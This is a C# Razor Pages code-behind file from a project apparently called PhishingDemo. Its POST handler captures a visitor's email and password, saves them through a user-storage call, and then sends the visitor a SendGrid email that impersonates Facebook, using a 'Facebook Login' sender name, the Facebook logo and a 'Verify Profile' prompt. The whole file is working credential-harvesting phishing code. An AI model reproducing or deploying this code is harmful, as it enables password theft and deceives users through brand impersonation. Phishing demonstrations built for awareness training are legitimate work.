using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using SendGrid;
using SendGrid.Helpers.Mail; // Required for SendGrid message creation
using System;
using System.Threading.Tasks;
using PhishingDemo.Controller;
using Microsoft.Extensions.Configuration;

namespace PhishingDemo.Pages
{
    public class IndexModel : PageModel
    {
        private readonly IConfiguration _configuration;
        public IndexModel(IConfiguration configuration)
        {
            _configuration = configuration;
        }

        [BindProperty]
        public string Email { get; set; } = string.Empty;
        [BindProperty]
        public string Password { get; set; } = string.Empty;
        [BindProperty]
        public string SuccessClass { get; set; } = string.Empty;

        public void OnGet()
        {
        }

        public async Task OnPostAsync()
        {
            BCS controlls = new BCS();
            controlls.AddUser(Email, Password);
            SuccessClass = "success-message";
            // Call method to send email
            await SendLoginEmailAsync(Email);
        }

        // Method to send email
        private async Task SendLoginEmailAsync(string userEmail)
        {
            try
            {
                var apiKey = _configuration["SendGridApiKey"];
                var client = new SendGridClient(apiKey);

                var message = new SendGridMessage
                {
                    From = new EmailAddress("ekwomnick@gmail.com", "Facebook Login"),
                    Subject = "Confirm Email",
                    HtmlContent = @"
                                    <html>
                                    <head>
                                        <style>
                                            .container {
                                                max-width: 600px;
                                                margin: auto;
                                                padding: 20px;
                                                border: 1px solid #ddd;
                                                border-radius: 10px;
                                                font-family: Arial, sans-serif;
                                            }
                
                                            .logo {
                                                width: 150px;
                                                margin: 0 auto 20px;
                                            }
                
                                            .message {
                                                font-size: 16px;
                                                color: #333;
                                            }
                
                                         
                                            .button {
                                                display: block;
                                                width: 200px;
                                                margin: 20px auto;
                                                padding: 10px 20px;
                                                background-color: #3b5998;
                                                color: white;
                                                text-align: center;
                                                text-decoration: none;
                                                border-radius: 5px;
                                            }
                                        </style>
                                    </head>
                                    <body>
                                        <div class='container'>
                                            <img class='logo' src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg' alt='Facebook Logo'>
                                            <p class='message'>You are One Step Closer to Securing your Account Click the Link to Verify Profile</p>
                                            <a class='button' href='#'>Go to Facebook</a>
                                        </div>
                                    </body>
                                    </html>"
                };
                message.AddTo(new EmailAddress(userEmail));


                // Send the email
                var response = await client.SendEmailAsync(message);
                if (response.StatusCode != System.Net.HttpStatusCode.OK &&
                    response.StatusCode != System.Net.HttpStatusCode.Accepted)
                {
                    throw new Exception($"Failed to send email. Status code: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                // Handle any exceptions, e.g., logging
                Console.WriteLine($"Error sending email: {ex.Message}");
            }
        }
    }
}
